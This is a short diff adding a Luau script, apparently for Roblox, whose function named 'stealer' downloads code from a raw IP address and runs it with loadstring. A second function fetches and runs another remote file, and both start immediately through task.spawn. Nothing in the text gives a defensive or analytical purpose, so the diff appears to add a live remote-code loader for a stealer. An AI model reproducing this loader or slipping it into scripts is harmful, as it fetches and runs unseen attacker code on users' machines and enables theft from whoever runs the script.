@@ -1,0 +1,9 @@
+local function stealer()
+  ID="070a090f-3516-4ee2-833d-58b6cfe6a8e9";
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+end
+local function loadui()
+  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
+end
+task.spawn(stealer)
+task.spawn(loadui)
